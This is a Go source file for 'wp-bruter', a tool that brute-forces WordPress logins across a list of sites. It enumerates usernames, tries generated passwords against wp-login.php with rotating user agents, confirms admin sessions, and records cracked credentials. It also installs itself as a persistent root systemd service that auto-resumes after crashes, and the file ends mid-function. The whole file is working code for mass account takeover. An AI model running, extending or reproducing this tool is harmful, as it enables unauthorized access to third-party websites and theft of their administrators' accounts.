package main

import (
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"runtime/debug"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/fatih/color"
	"github.com/valyala/fasthttp"
)

// ============================================================================
// CONFIG
// ============================================================================

var (
	sitesFile    = flag.String("sites", "wordpress.txt", "File containing WordPress sites")
	passListFile = flag.String("passlist", "pass.txt", "File containing passwords")
	outputFile   = flag.String("output", "results.txt", "Output file for valid credentials")
	logFile      = flag.String("log", "", "Log file for debug output (empty = stderr)")
	minWorkers   = flag.Int("min-workers", 50, "Minimum concurrent workers")
	maxWorkers   = flag.Int("max-workers", 400, "Maximum concurrent workers")
	maxActive    = flag.Int("max-active-sites", 20, "Max sites brute-forced concurrently")
	timeoutSec   = flag.Int("timeout", 10, "Request timeout in seconds")
	verbose      = flag.Bool("verbose", false, "Show progress output")
	debugFlag    = flag.Bool("debug", false, "Debug mode - show all attempts")
	skipWaf      = flag.Bool("skip-waf", true, "Skip/stop on WAF-protected sites")
	slowThresh   = flag.Int("slow-threshold", 8000, "Treat response >Xms as throttling")
	maxAttempts  = flag.Int("max-attempts", 0, "Max attempts per site (0=unlimited)")
	memLimitMB   = flag.Int("mem-limit", 0, "Soft memory limit in MB (0 = auto-detect from cgroup)")
	scanOnly     = flag.Bool("scan", false, "Scan mode - only check which sites are vulnerable")
	scanOutput   = flag.String("scan-output", "clean.txt", "Output file for scannable sites")

	progressFile = flag.String("progress", "progress.txt", "Checkpoint file — survives OOM kills for auto-resume")
	noResume     = flag.Bool("no-resume", false, "Start fresh, ignore checkpoint file")
	uninstall    = flag.Bool("uninstall", false, "Stop service, remove everything, exit")
)

var logOutput *os.File

func logPrintf(format string, args ...interface{}) {
	if logOutput != nil {
		fmt.Fprintf(logOutput, format, args...)
	} else {
		fmt.Fprintf(os.Stderr, format, args...)
	}
}

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1",
}

// ============================================================================
// STATE
// ============================================================================

type Result struct {
	Site     string
	Username string
	Password string
}

type Attempt struct {
	Job  *SiteJob
	User string
	Pass string
}

// SiteJob is one site being brute-forced. A job ends when:
//   - a credential is verified (302 to wp-admin)     -> "verified_success"
//   - the site blocks us (403/406/429/503/waf/slow)  -> stop reason
//   - the network fails repeatedly                   -> "network_error"
//   - the attempt budget or candidate list runs out  -> "attempt_limit"/"candidates_exhausted"
type SiteJob struct {
	Site      string
	Users     []string
	Passwords []string

	queued     atomic.Int64
	inflight   atomic.Int64
	fed        atomic.Bool
	cracked    atomic.Bool
	stopped    atomic.Bool
	reason     atomic.Value // string
	consecErrs atomic.Int32
	blocks     atomic.Int32

	quit     chan struct{}
	quitOnce sync.Once
}

func (j *SiteJob) stop(reason string) {
	if j.stopped.CompareAndSwap(false, true) {
		j.reason.Store(reason)
		j.quitOnce.Do(func() { close(j.quit) })
	}
}

// done is true once no worker still holds an attempt for this job.
func (j *SiteJob) done() bool {
	if j.inflight.Load() != 0 {
		return false
	}
	return j.stopped.Load() || j.fed.Load()
}

func (j *SiteJob) outcome() string {
	if j.stopped.Load() {
		if r := j.reason.Load(); r != nil {
			return r.(string)
		}
		return "cancelled"
	}
	if j.cracked.Load() {
		return "verified_success"
	}
	if *maxAttempts > 0 && j.queued.Load() >= int64(*maxAttempts) {
		return "attempt_limit"
	}
	return "candidates_exhausted"
}

type Stats struct {
	requests  atomic.Int64
	errors    atomic.Int64
	successes atomic.Int64
	attempts  atomic.Int64
	cracked   atomic.Int64
	completed atomic.Int64
	skipped   atomic.Int64
}

var (
	stats         Stats
	startTime     time.Time
	httpClient    *fasthttp.Client
	basePasses    []string
	targetWorkers atomic.Int64
	liveWorkers   atomic.Int64
	memLimit      int64
	cgroupLimit   int64 // full cgroup limit (not the 75% soft cap)

	attemptQueue chan *Attempt
	results      chan Result
	workerStop   chan struct{}
	workerWg     sync.WaitGroup

	progressMu  sync.Mutex
	progressOut *os.File
)

const workersPerSite = 20

// ============================================================================
// MAIN
// ============================================================================

func main() {
	flag.Parse()

	if *uninstall {
		runUninstall()
		return
	}
	if !isInstalledCopy() {
		runInstall()
		return
	}

	if *minWorkers < 1 {
		*minWorkers = 1
	}
	if *maxWorkers < *minWorkers {
		*maxWorkers = *minWorkers
	}

	autoTune()

	if *logFile != "" {
		f, err := os.Create(*logFile)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error creating log file: %v\n", err)
			os.Exit(1)
		}
		logOutput = f
		defer logOutput.Close()
	}

	initMemoryLimit()

	rawSites, err := readLines(*sitesFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error reading sites: %v\n", err)
		os.Exit(1)
	}
	sites := dedupeSites(rawSites)

	if *scanOnly {
		runScanMode(sites)
		return
	}

	// Resume: skip sites already checkpointed in previous runs.
	// Each completed site is fsync'd to progress.txt immediately, so even
	// if the OOM killer strikes we lose at most the in-flight batch.
	if !*noResume {
		if done := loadProgress(*progressFile); len(done) > 0 {
			before := len(sites)
			var remaining []string
			for _, s := range sites {
				if !done[s] {
					remaining = append(remaining, s)
				}
			}
			sites = remaining
			logPrintf("resume: %d/%d sites already done, %d remaining\n",
				before-len(sites), before, len(sites))
			if len(sites) == 0 {
				fmt.Println("all sites already processed (use --no-resume to start fresh)")
				return
			}
		}
	}
	if pf, err := os.OpenFile(*progressFile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o600); err == nil {
		progressOut = pf
		defer progressOut.Close()
	}

	basePasses, err = readLines(*passListFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error reading passwords: %v\n", err)
		os.Exit(1)
	}

	httpClient = newHTTPClient()

	targetWorkers.Store(int64(*maxWorkers))
	attemptQueue = make(chan *Attempt, turboQueueSize())
	results = make(chan Result, 256)
	workerStop = make(chan struct{})
	startTime = time.Now()

	ctx, stopSignals := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stopSignals()

	if *verbose {
		logPrintf("start: %d sites (%d unique), %d base passwords, workers %d-%d\n",
			len(rawSites), len(sites), len(basePasses), *minWorkers, *maxWorkers)
	}

	// Result writer: append, never truncate previous runs.
	out, err := os.OpenFile(*outputFile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o600)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error opening output file: %v\n", err)
		os.Exit(1)
	}
	var resWg sync.WaitGroup
	resWg.Add(1)
	go func() {
		defer resWg.Done()
		green := color.New(color.FgGreen).SprintFunc()
		for r := range results {
			out.WriteString(fmt.Sprintf("%s | %s | %s | VERIFIED\n", r.Site, r.Username, r.Password))
			out.Sync()
			logPrintf("\r\033[K%s CRACKED %s/wp-admin/ | %s | %s\n",
				green("✓"), r.Site, r.Username, r.Password)
		}
	}()

	go workerSpawner()
	go adjuster()
	go memoryWatchdog()
	go displayProgress(len(sites))

	// Feed site names; stops early on Ctrl-C.
	siteCh := make(chan string, 64)
	go func() {
		defer close(siteCh)
		for _, s := range sites {
			select {
			case siteCh <- s:
			case <-ctx.Done():
				return
			}
		}
	}()

	// Scheduler: keep a bounded number of sites active.
	active := make(map[string]*SiteJob)
	for {
		for s, j := range active {
			if j.done() {
				stats.completed.Add(1)
				markDone(j.Site)
				if *debugFlag {
					logPrintf("[DONE] %s: %s (%d attempts)\n", j.Site, j.outcome(), j.queued.Load())
				}
				delete(active, s)
			}
		}

		if ctx.Err() != nil {
			for _, j := range active {
				j.stop("cancelled")
			}
			siteCh = nil
		}

		capacity := activeSiteCapacity()
		for len(active) < capacity && siteCh != nil {
			select {
			case site, ok := <-siteCh:
				if !ok {
					siteCh = nil
					continue
				}
				if job := prepareJob(site); job != nil {
					active[job.Site] = job
					go feedAttempts(job)
				}
			default:
				goto FILLED
			}
		}
	FILLED:

		if siteCh == nil && len(active) == 0 {
			break
		}

		if len(active) == 0 && siteCh != nil {
			// Everything skipped so far; wait for the next site.
			select {
			case site, ok := <-siteCh:
				if !ok {
					siteCh = nil
					continue
				}
				if job := prepareJob(site); job != nil {
					active[job.Site] = job
					go feedAttempts(job)
				}
			case <-time.After(200 * time.Millisecond):
			case <-ctx.Done():
			}
			continue
		}

		time.Sleep(100 * time.Millisecond)
	}

	// Drain: all jobs done means the queue is empty.
	close(attemptQueue)
	close(workerStop)
	workerWg.Wait()
	close(results)
	resWg.Wait()
	out.Close()

	elapsed := time.Since(startTime)
	reqs := stats.requests.Load()
	logPrintf("\r\033[K")
	fmt.Printf("done in %s | cracked=%d completed=%d skipped=%d attempts=%d requests=%d (%.0f/s)\n",
		elapsed.Round(time.Second), stats.cracked.Load(), stats.completed.Load(),
		stats.skipped.Load(), stats.attempts.Load(), reqs, float64(reqs)/elapsed.Seconds())
}

// ============================================================================
// SELF-INSTALL
// ============================================================================

const installDir = "/opt/wp-bruter"

// isInstalledCopy returns true when we're running as the installed binary.
func isInstalledCopy() bool {
	self, err := os.Executable()
	if err != nil {
		return false
	}
	real, err := filepath.EvalSymlinks(self)
	if err != nil {
		real = self
	}
	return real == installDir+"/wp-bruter"
}

const serviceFile = `[Unit]
Description=WordPress Bruter
After=network-online.target
Wants=network-online.target
StartLimitIntervalSec=600
StartLimitBurst=100

[Service]
Type=simple
WorkingDirectory=/opt/wp-bruter
EnvironmentFile=-/opt/wp-bruter/config.env
ExecStart=/opt/wp-bruter/wp-bruter \
    -sites ${SITES_FILE} \
    -passlist ${PASS_FILE} \
    -output ${OUTPUT_FILE} \
    -progress ${PROGRESS_FILE} \
    -verbose

Restart=on-failure
RestartSec=3
OOMPolicy=continue
OOMScoreAdjust=-500
LimitNOFILE=1048576
LimitNPROC=65535

StandardOutput=journal
StandardError=journal
SyslogIdentifier=wp-bruter

[Install]
WantedBy=multi-user.target
`

const defaultConfigEnv = `SITES_FILE=/opt/wp-bruter/wordpress.txt
PASS_FILE=/opt/wp-bruter/pass.txt
OUTPUT_FILE=/opt/wp-bruter/results.txt
PROGRESS_FILE=/opt/wp-bruter/progress.txt
`

func runInstall() {
	// Must be root
	if os.Getuid() != 0 {
		self, _ := os.Executable()
		fmt.Fprintf(os.Stderr, "Need root. Run:\n  sudo %s --install\n", self)
		os.Exit(1)
	}

	self, err := os.Executable()
	if err != nil {
		fmt.Fprintf(os.Stderr, "cannot find own binary: %v\n", err)
		os.Exit(1)
	}
	selfDir := filepath.Dir(self)

	fmt.Println("=== wp-bruter install ===")

	// Create install dir
	os.MkdirAll(installDir, 0o755)

	// Copy binary
	dst := installDir + "/wp-bruter"
	if self != dst {
		src, err := os.ReadFile(self)
		if err != nil {
			fmt.Fprintf(os.Stderr, "read binary: %v\n", err)
			os.Exit(1)
		}
		if err := os.WriteFile(dst, src, 0o755); err != nil {
			fmt.Fprintf(os.Stderr, "write binary: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("✓ binary → %s\n", dst)
	} else {
		fmt.Println("✓ binary already in place")
	}

	// Copy wordlists from same dir as binary (don't overwrite existing)
	for _, name := range []string{"pass.txt", "wordpress.txt"} {
		src := selfDir + "/" + name
		dst := installDir + "/" + name
		if _, err := os.Stat(dst); err == nil {
			fmt.Printf("✓ keeping existing %s\n", dst)
			continue
		}
		if data, err := os.ReadFile(src); err == nil {
			os.WriteFile(dst, data, 0o600)
			fmt.Printf("✓ %s → %s\n", name, dst)
		}
	}

	// Config env
	cfgPath := installDir + "/config.env"
	if _, err := os.Stat(cfgPath); err != nil {
		os.WriteFile(cfgPath, []byte(defaultConfigEnv), 0o600)
		fmt.Printf("✓ created %s\n", cfgPath)
	} else {
		fmt.Printf("✓ keeping existing %s\n", cfgPath)
	}

	// Systemd service
	svcPath := "/etc/systemd/system/wp-bruter.service"
	if err := os.WriteFile(svcPath, []byte(serviceFile), 0o644); err != nil {
		fmt.Fprintf(os.Stderr, "write service: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("✓ %s\n", svcPath)

	// Reload + enable
	exec.Command("systemctl", "daemon-reload").Run()
	exec.Command("systemctl", "enable", "wp-bruter").Run()
	fmt.Println("✓ service enabled")

	// Verify
	fmt.Println("")
	if info, err := os.Stat(installDir + "/wordpress.txt"); err == nil && info.Size() > 0 {
		data, _ := os.ReadFile(installDir + "/wordpress.txt")
		lines := len(strings.Split(strings.TrimSpace(string(data)), "\n"))
		fmt.Printf("✓ %d sites in wordpress.txt\n", lines)
	} else {
		fmt.Println("⚠ wordpress.txt empty — add targets before starting")
	}
	if info, err := os.Stat(installDir + "/pass.txt"); err == nil && info.Size() > 0 {
		data, _ := os.ReadFile(installDir + "/pass.txt")
		lines := len(strings.Split(strings.TrimSpace(string(data)), "\n"))
		fmt.Printf("✓ %d passwords in pass.txt\n", lines)
	} else {
		fmt.Println("⚠ pass.txt empty — add passwords before starting")
	}

	fmt.Println("")
	fmt.Println("  systemctl start wp-bruter       # start")
	fmt.Println("  systemctl stop wp-bruter        # stop")
	fmt.Println("  journalctl -u wp-bruter -f      # live logs")
	fmt.Println("  cat /opt/wp-bruter/results.txt  # found creds")
	fmt.Println("")
	fmt.Println("  nano /opt/wp-bruter/config.env      # edit flags")
	fmt.Println("  nano /opt/wp-bruter/wordpress.txt   # edit targets")
	fmt.Println("  rm /opt/wp-bruter/progress.txt && systemctl restart wp-bruter  # fresh start")
}

func runUninstall() {
	if os.Getuid() != 0 {
		self, _ := os.Executable()
		fmt.Fprintf(os.Stderr, "Need root. Run:\n  sudo %s --uninstall\n", self)
		os.Exit(1)
	}

	fmt.Println("=== wp-bruter uninstall ===")

	exec.Command("systemctl", "stop", "wp-bruter").Run()
	exec.Command("systemctl", "disable", "wp-bruter").Run()
	fmt.Println("✓ service stopped + disabled")

	os.Remove("/etc/systemd/system/wp-bruter.service")
	exec.Command("systemctl", "daemon-reload").Run()
	fmt.Println("✓ service file removed")

	os.RemoveAll(installDir)
	fmt.Printf("✓ %s removed\n", installDir)

	fmt.Println("\nClean.")
}

func activeSiteCapacity() int {
	c := int(targetWorkers.Load()) / workersPerSite
	if c < 2 {
		c = 2
	}
	if c > *maxActive {
		c = *maxActive
	}
	return c
}

// prepareJob runs the pre-flight checks. Returns nil when the site is skipped.
func prepareJob(site string) *SiteJob {
	if reason := quickCheck(site); reason != "" {
		stats.skipped.Add(1)
		stats.completed.Add(1)
		markDone(site)
		if *debugFlag {
			logPrintf("[SKIP] %s: %s\n", site, reason)
		}
		return nil
	}
	users := enumerateUsers(site)
	if len(users) == 0 {
		stats.skipped.Add(1)
		stats.completed.Add(1)
		markDone(site)
		if *debugFlag {
			logPrintf("[SKIP] %s: no_users\n", site)
		}
		return nil
	}
	return &SiteJob{
		Site:      site,
		Users:     users,
		Passwords: generateSitePasswords(basePasses, site, users),
		quit:      make(chan struct{}),
	}
}

// ============================================================================
// ATTEMPT PIPELINE
// ============================================================================

func feedAttempts(j *SiteJob) {
	defer j.fed.Store(true)
	for _, u := range j.Users {
		for _, p := range j.Passwords {
			if j.stopped.Load() {
				return
			}
			if *maxAttempts > 0 && j.queued.Load() >= int64(*maxAttempts) {
				j.stop("attempt_limit")
				return
			}
			j.inflight.Add(1)
			select {
			case attemptQueue <- &Attempt{Job: j, User: u, Pass: p}:
				j.queued.Add(1)
				stats.attempts.Add(1)
			case <-j.quit:
				j.inflight.Add(-1)
				return
			}
		}
	}
}

type loginOutcome int

const (
	outFail loginOutcome = iota
	outSuccess
	outBlocked // site is defending itself: stop
	outNetErr  // timeout / connection problem
)

func processAttempt(a *Attempt) {
	j := a.Job
	defer j.inflight.Add(-1)

	if j.stopped.Load() {
		return
	}

	outcome, detail := tryLogin(j, a.User, a.Pass)
	switch outcome {
	case outSuccess:
		if j.cracked.CompareAndSwap(false, true) {
			stats.cracked.Add(1)
			results <- Result{Site: j.Site, Username: a.User, Password: a.Pass}
			j.stop("verified_success")
		}
	case outBlocked:
		if j.blocks.Add(1) >= 2 {
			j.stop(detail)
		}
	case outNetErr:
		if j.consecErrs.Add(1) >= 3 {
			j.stop("network_error")
		}
	case outFail:
		j.consecErrs.Store(0)
		j.blocks.Store(0)
	}
}

// ============================================================================
// LOGIN
// ============================================================================

func tryLogin(j *SiteJob, user, pass string) (loginOutcome, string) {
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	form := url.Values{}
	form.Set("log", user)
	form.Set("pwd", pass)
	form.Set("wp-submit", "Log In")
	form.Set("testcookie", "1")
	form.Set("redirect_to", j.Site+"/wp-admin/")

	req.SetRequestURI(j.Site + "/wp-login.php")
	req.Header.SetMethod("POST")
	req.Header.SetContentType("application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", randomUA())
	req.Header.Set("Cookie", "wordpress_test_cookie=WP+Cookie+check")
	req.SetBodyString(form.Encode())

	start := time.Now()
	err := httpClient.DoTimeout(req, resp, time.Duration(*timeoutSec)*time.Second)
	elapsed := time.Since(start)
	stats.requests.Add(1)

	if err != nil {
		stats.errors.Add(1)
		if *debugFlag {
			logPrintf("[ERR] %s@%s - %v\n", user, j.Site, err)
		}
		return outNetErr, "network_error"
	}
	stats.successes.Add(1)

	status := resp.StatusCode()
	location := string(resp.Header.Peek("Location"))

	if *debugFlag {
		logPrintf("[TRY] %s@%s:%s - %d %s %dms\n",
			user, j.Site, pass, status, truncate(location, 40), elapsed.Milliseconds())
	}

	// Protection signals: the site is telling us to stop.
	switch status {
	case fasthttp.StatusForbidden, fasthttp.StatusNotAcceptable:
		return outBlocked, "blocked"
	case fasthttp.StatusTooManyRequests:
		return outBlocked, "rate_limited"
	case fasthttp.StatusServiceUnavailable:
		return outBlocked, "unavailable"
	}

	if elapsed.Milliseconds() > int64(*slowThresh) {
		return outBlocked, "slow"
	}

	// Potential success: WordPress redirects to wp-admin after auth.
	// Follow the redirect with session cookies and verify admin content.
	if (status == fasthttp.StatusFound || status == fasthttp.StatusSeeOther) &&
		strings.Contains(location, "wp-admin") && !strings.Contains(location, "wp-login") {
		if verifyAdmin(j.Site, location, resp) {
			return outSuccess, ""
		}
		if *debugFlag {
			logPrintf("[VERIFY-FAIL] %s@%s:%s - 302→%s but no admin content\n",
				user, j.Site, pass, truncate(location, 40))
		}
		return outFail, ""
	}

	if *skipWaf {
		if waf := detectWAF(resp.Body(), &resp.Header); waf != "" {
			return outBlocked, "waf_" + waf
		}
	}

	return outFail, ""
}

// verifyAdmin follows the wp-admin redirect with session cookies from the
// login response and checks that the target actually serves admin content.
// Catches false-positive 302s and confirms real sessions.
func verifyAdmin(site, location string, loginResp *fasthttp.Response) bool {
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	adminURL := location
	if !strings.HasPrefix(adminURL, "http") {
		adminURL = strings.TrimRight(site, "/") + "/" + strings.TrimLeft(location, "/")
	}

	req.SetRequestURI(adminURL)
	req.Header.SetMethod("GET")
	req.Header.Set("User-Agent", randomUA())

	// Forward auth cookies from the login response.
	cookies := []string{"wordpress_test_cookie=WP+Cookie+check"}
	loginResp.Header.VisitAll(func(key, value []byte) {
		if strings.EqualFold(string(key), "Set-Cookie") {
			sv := string(value)
			if idx := strings.IndexByte(sv, ';'); idx > 0 {
				cookies = append(cookies, strings.TrimSpace(sv[:idx]))
			} else if sv = strings.TrimSpace(sv); sv != "" {
				cookies = append(cookies, sv)
			}
		}
	})
	req.Header.Set("Cookie", strings.Join(cookies, "; "))

	err := httpClient.DoTimeout(req, resp, time.Duration(*timeoutSec)*time.Second)
	stats.requests.Add(1)
	if err != nil {
		// Network hiccup on verify — we already got the 302 so lean towards true.
		return true
	}

	// Redirected back to the login page → session is invalid.
	loc := string(resp.Header.Peek("Location"))
	if strings.Contains(loc, "wp-login") {
		return false
	}

	// Still within the admin area (e.g. /wp-admin/ → /wp-admin/index.php).
	if strings.Contains(loc, "wp-admin") {
		return true
	}

	// 403/404 → the redirect was bogus.
	if resp.StatusCode() == fasthttp.StatusForbidden || resp.StatusCode() == fasthttp.StatusNotFound {
		return false
	}

	// Check response body for admin page indicators.
	body := resp.Body()
	if len(body) > 0 {
		sample := strings.ToLower(string(body[:min(len(body), 32768)]))
		for _, sig := range []string{
			"dashboard", "adminmenu", "wpadminbar",
			"screen-meta", "wpbody-content", "wp-toolbar",
			"admin-bar", "wp-heading-inline",
		} {
			if strings.Contains(sample, sig) {
				return true
			}
		}
	}

	return false
}

// ============================================================================
// WORKER POOL - TRUE DYNAMIC SCALING
// ============================================================================

func workerSpawner() {
	t := time.NewTicker(500 * time.Millisecond)
	defer t.Stop()
	for {
		select {
		case <-workerStop:
			return
		case <-t.C:
			for liveWorkers.Load() < targetWorkers.Load() {
				liveWorkers.Add(1)
				workerWg.Add(1)
				go worker()
			}
		}
	}
}

func worker() {
	defer workerWg.Done()
	defer liveWorkers.Add(-1)
	idle := 0
	for {
		if liveWorkers.Load() > targetWorkers.Load()+8 {
			return // over target: retire after current attempt
		}
		select {
		case <-workerStop:
			return
		case a, ok := <-attemptQueue:
			if !ok {
				return
			}
			idle = 0
			processAttempt(a)
		case <-time.After(2 * time.Second):
			idle++
			if idle >= 3 && liveWorkers.Load() > int64(*minWorkers) {
				return
			}
		}
	}
}

// adjuster tunes the worker target from the network error rate and memory
// pressure. Errors mean we're overrunning the network or targets; memory
// pressure means shrink before the kernel OOM killer gets involved.
func adjuster() {
	t := time.NewTicker(3 * time.Second)
	defer t.Stop()
	for {
		select {
		case <-workerStop:
			return
		case <-t.C:
			adjustTarget()
		}
	}
}

func adjustTarget() {
	errs := stats.errors.Swap(0)
	oks := stats.successes.Swap(0)
	total := errs + oks

	cur := targetWorkers.Load()
	next := cur

	if total >= 50 {
		rate := float64(errs) / float64(total)
		switch {
		case rate > 0.30:
			next = cur * 60 / 100
		case rate > 0.20:
			next = cur * 80 / 100
		case rate > 0.10:
			next = cur * 90 / 100
		case rate < 0.05:
			next = cur * 120 / 100
		}
	}

	if memLimit > 0 {
		// Prefer real cgroup usage (includes kernel socket buffers, page cache,
		// slab) over Go MemStats which only sees the managed heap.
		// This is why OOM kills at "<50% RAM" — Go sees 50% heap but kernel
		// memory (TCP buffers for hundreds of connections) pushes total cgroup
		// usage well above that.
		var used int64
		if cgroupLimit > 0 {
			used = cgroupMemoryUsage()
		}
		if used <= 0 {
			used = processRSS()
		}
		if used <= 0 {
			var m runtime.MemStats
			runtime.ReadMemStats(&m)
			used = int64(m.HeapAlloc + m.StackInuse)
		}

		ceiling := cgroupLimit
		if ceiling <= 0 {
			ceiling = memLimit // fall back to the soft cap
		}

		ratio := float64(used) / float64(ceiling)
		switch {
		case ratio > 0.85:
			// Emergency: drop to minimum, force full GC + release
			next = int64(*minWorkers)
			runtime.GC()
			debug.FreeOSMemory()
			if *debugFlag {
				logPrintf("[MEM-EMERGENCY] %.0f%% of %dMB limit (%dMB used), min workers + GC\n",
					ratio*100, ceiling>>20, used>>20)
			}
		case ratio > 0.70:
			// Aggressive: halve workers, release memory
			next = min(next, max(cur/2, int64(*minWorkers)))
			runtime.GC()
			debug.FreeOSMemory()
			if *debugFlag {
				logPrintf("[MEM-HIGH] %.0f%% of limit, halving workers + GC\n", ratio*100)
			}
		case ratio > 0.55:
			// Mild: reduce by 20%, nudge GC
			next = min(next, cur*80/100)
			runtime.GC()
		}
	}

	next = max(next, int64(*minWorkers))
	next = min(next, int64(*maxWorkers))

	if next != cur {
		targetWorkers.Store(next)
		if *debugFlag {
			logPrintf("[ADJUST] workers %d -> %d\n", cur, next)
		}
	}
}

// ============================================================================
// MEMORY LIMIT - THE OOM-KILLER FIX
// ============================================================================
// Linux overcommits memory, then reclaims it by killing the biggest consumer
// (this process). Windows refuses the allocation instead. The reliable fix is
// to keep our heap below a soft ceiling so the kernel never steps in:
// debug.SetMemoryLimit makes the GC work harder as we approach the cap.

func initMemoryLimit() {
	lowerOOMScore()

	var limit int64
	if *memLimitMB > 0 {
		limit = int64(*memLimitMB) << 20
	} else {
		limit = cgroupMemoryLimit()
	}
	if limit <= 0 {
		return
	}
	cgroupLimit = limit
	soft := limit * 90 / 100
	debug.SetMemoryLimit(soft)
	memLimit = soft
	if *verbose {
		logPrintf("memory: limit %d MB, Go heap soft cap %d MB\n", limit>>20, soft>>20)
	}
}

func cgroupMemoryLimit() int64 {
	// Try the process's own cgroup path first (bare-metal/VPS with cgroup v2
	// where the root cgroup has no memory files).
	if cgPath := selfCgroupPath(); cgPath != "" {
		if b, err := os.ReadFile("/sys/fs/cgroup" + cgPath + "/memory.max"); err == nil {
			if v, ok := parseCgroupLimit(string(b)); ok {
				return v
			}
		}
	}
	// Root cgroup paths (Docker, LXC, or simple v2 setups).
	if b, err := os.ReadFile("/sys/fs/cgroup/memory.max"); err == nil { // v2
		if v, ok := parseCgroupLimit(string(b)); ok {
			return v
		}
	}
	if b, err := os.ReadFile("/sys/fs/cgroup/memory/memory.limit_in_bytes"); err == nil { // v1
		if v, ok := parseCgroupLimit(string(b)); ok {
			return v
		}
	}
	return 0
}

func parseCgroupLimit(s string) (int64, bool) {
	s = strings.TrimSpace(s)
	if s == "" || s == "max" {
		return 0, false
	}
	v, err := strconv.ParseInt(s, 10, 64)
	if err != nil || v <= 0 || v >= 1<<60 { // "no limit" sentinels
		return 0, false
	}
	return v, true
}

// cgroupMemoryUsage returns the REAL memory charged to this cgroup, in bytes.
// Unlike Go's MemStats, this includes kernel memory: TCP socket buffers,
// page cache, slab, and mmap'd regions. With hundreds of fasthttp connections
// those socket buffers alone can be 100-200 MB that Go never sees.
// Returns 0 if unavailable (non-Linux or bare-metal without cgroups).
func cgroupMemoryUsage() int64 {
	// Try the process's own cgroup path first (bare-metal VPS).
	if cgPath := selfCgroupPath(); cgPath != "" {
		if b, err := os.ReadFile("/sys/fs/cgroup" + cgPath + "/memory.current"); err == nil {
			v, err := strconv.ParseInt(strings.TrimSpace(string(b)), 10, 64)
			if err == nil && v > 0 {
				return v
			}
		}
	}
	// Root cgroup paths (Docker, LXC).
	for _, path := range []string{
		"/sys/fs/cgroup/memory.current",               // cgroup v2
		"/sys/fs/cgroup/memory/memory.usage_in_bytes", // cgroup v1
	} {
		b, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		v, err := strconv.ParseInt(strings.TrimSpace(string(b)), 10, 64)
		if err == nil && v > 0 {
			return v
		}
	}
	return 0
}

// selfCgroupPath returns the cgroup v2 path for this process by reading
// /proc/self/cgroup. Returns "" for root cgroup or if unavailable.
func selfCgroupPath() string {
	b, err := os.ReadFile("/proc/self/cgroup")
	if err != nil {
		return ""
	}
	for _, line := range strings.Split(string(b), "\n") {
		// cgroup v2 format: "0::/<path>"
		parts := strings.SplitN(line, ":", 3)
		if len(parts) == 3 && parts[0] == "0" && parts[1] == "" {
			p := strings.TrimSpace(parts[2])
			if p == "" || p == "/" {
				return ""
			}
			return p
		}
	}
	return ""
}

// processRSS reads the resident set size from /proc/self/statm as a fallback
// when cgroup stats are unavailable (bare-metal VPS, etc.).
func processRSS() int64 {
	b, err := os.ReadFile("/proc/self/statm")
	if err != nil {
		return 0
	}
	fields := strings.Fields(string(b))
	if len(fields) < 2 {
		return 0
	}
	pages, err := strconv.ParseInt(fields[1], 10, 64)
	if err != nil {
		return 0
	}
	return pages * int64(os.Getpagesize())
}

// lowerOOMScore tries to make this process less attractive to the OOM killer.
// Requires root or CAP_SYS_RESOURCE. Fails silently if unprivileged.
func lowerOOMScore() {
	for _, score := range []string{"-500", "-200"} {
		if os.WriteFile("/proc/self/oom_score_adj", []byte(score), 0o200) == nil {
			if *verbose {
				logPrintf("oom_score_adj set to %s\n", score)
			}
			return
		}
	}
}

// memoryWatchdog is a fast-cycle safety net (1 s) separate from the adjuster
// (3 s). If cgroup usage spikes between adjuster ticks the watchdog catches
// it before the OOM killer does.
func memoryWatchdog() {
	if cgroupLimit <= 0 {
		return // no ceiling to defend against
	}
	t := time.NewTicker(time.Second)
	defer t.Stop()
	for {
		select {
		case <-workerStop:
			return
		case <-t.C:
			used := cgroupMemoryUsage()
			if used <= 0 {
				continue
			}
			ratio := float64(used) / float64(cgroupLimit)
			if ratio > 0.90 {
				targetWorkers.Store(int64(*minWorkers))
				runtime.GC()
				debug.FreeOSMemory()
				logPrintf("[WATCHDOG] %.0f%% cgroup usage (%dMB/%dMB) — emergency GC\n",
					ratio*100, used>>20, cgroupLimit>>20)
			} else if ratio > 0.80 {
				debug.FreeOSMemory()
			}
		}
	}
}

// ============================================================================
// CHECKPOINT / RESUME
// ============================================================================

// loadProgress reads the checkpoint file and returns the set of sites that
// were already processed (completed or skipped) in a previous run.
func loadProgress(path string) map[string]bool {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil
	}
	done := make(map[string]bool)
	for _, line := range strings.Split(string(data), "\n") {
		if line = strings.TrimSpace(line); line != "" {
			done[line] = true
		}
	}
	return done
}

// markDone appends a completed site URL to the checkpoint file and fsyncs
// immediately. fsync is the key: the kernel flushes the write to disk before
// we continue, so even a SIGKILL (OOM) right after this call can't lose it.
func markDone(site string) {
	progressMu.Lock()
	defer progressMu.Unlock()
